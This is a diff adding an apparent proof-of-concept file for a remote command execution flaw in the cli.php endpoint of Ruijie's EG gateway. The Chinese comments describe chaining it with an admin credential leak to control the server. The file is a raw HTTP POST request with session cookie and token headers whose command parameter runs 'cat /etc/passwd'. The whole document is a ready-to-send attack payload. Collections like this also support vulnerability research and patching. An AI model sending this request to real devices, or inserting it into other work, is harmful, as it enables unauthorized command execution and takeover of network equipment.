@@ -1,0 +1,11 @@
+# 锐捷 EG易网关 cli.php 远程命令执行漏洞
+# 锐捷EG易网关 cli.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器
+POST /cli.php?a=shell&acid=80051538&bid=hd_tag_m8mv245f HTTP/1.1
+Host: www.swaf.com
+Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin;
+RM-PRO-BusinessID: hd_tag_m8mv245f
+RM-PRO-Token: ec9406bae5458ddac46bd6543ebd3d45
+RM-PRO-Time: 1742808364324
+User-Agent: curl/7.83.1
+
+notdelay=true&command=cat /etc/passwd
